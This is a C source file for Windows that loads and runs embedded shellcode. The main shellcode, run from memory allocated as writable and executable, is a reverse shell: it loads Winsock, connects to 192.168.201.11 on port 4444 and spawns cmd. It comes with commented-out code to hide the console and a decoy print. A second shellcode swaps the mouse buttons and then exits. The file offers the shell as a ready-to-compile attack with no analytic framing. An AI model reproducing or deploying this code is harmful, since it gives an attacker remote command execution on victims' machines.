#include <windows.h>

char code[] = 
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
"\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
"\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
"\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53"
"\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54"
"\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33"
"\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04"
"\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68"
"\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc"
"\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c"
"\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68"
"\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06"
"\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b"
"\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63"
"\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c"
"\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83"
"\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61"
"\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72"
"\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64"
"\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57"
"\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
"\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
"\x52\x52\x51\x52\xff\xd5";

int main(int argc, char** argv)
{
	void * exec;
	// HWND hWnd = GetConsoleWindow();
	// ShowWindow(hWnd, SW_HIDE);
	printf("sdfasdf");
	exec = VirtualAlloc(0, strlen(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	return 0;
}


int main2()
{
    char *shellcode =
    "\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75"
    "\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79\x41\x68"
    "\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68\x75\x73"
    "\x65\x72\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\xB9\x74\x6F\x6E\x61\x51\x83\x6C\x24\x03\x61\x68\x65\x42\x75\x74\x68"
    "\x4D\x6F\x75\x73\x68\x53\x77\x61\x70\x54\x50\xFF\xD2\x83\xC4\x14\x33\xC9"
    "\x41" // inc ecx - Remove this to restore the functionality
    "\x51\xFF\xD0\x83\xC4\x04\x5A\x5B\xB9\x65\x73\x73\x61"
    "\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x33\xC9\x51\xFF\xD0";
 
    // Set memory as executable
    DWORD old = 0;
    BOOL ret = VirtualProtect(shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &old);
 
    // Call the shellcode

	((void(*)())shellcode)();

    return 0;
}